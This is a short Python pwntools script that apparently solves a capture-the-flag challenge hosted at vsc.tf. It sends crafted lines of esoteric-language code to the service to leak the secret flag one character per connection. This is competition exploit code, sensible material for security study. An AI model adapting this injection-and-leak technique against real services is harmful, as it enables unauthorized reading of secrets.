# [v>,_] / [v>,_] 
# [ "  ] / [   "]
# [>^  ] / [>  ^]

from pwn import *

# nc vsc.tf 3093
HOST = "vsc.tf"
PORT = 3093


log.level = "warning"

flag = "vsctf{" # vsctf{??????????????????????????????}
start_leak_offset = len(flag)
while True:
    io = remote(HOST, PORT)
    line1 = b"v" + b" " * (start_leak_offset - 1 if start_leak_offset < 3 else start_leak_offset - 3) + b">,_"
    line2 = b" " + b" " * (start_leak_offset - 1) + b"\""
    line3 = b">" + b" " * (start_leak_offset - 1) + b"^"
    
    try:
        io.sendlineafter(b"Line 1: ", line1)
        io.sendlineafter(b"Line 2: ", line2)
        io.sendlineafter(b"Line 3: ", line3)
        flag += io.recv(2).decode()[1]
    except Exception as e:
        print(f"{e = }")
        print(f"{line1 = }")
        print(f"{line2 = }")
        print(f"{line3 = }")
        break
    io.close()
    
    start_leak_offset += 1
print(f"{flag = }")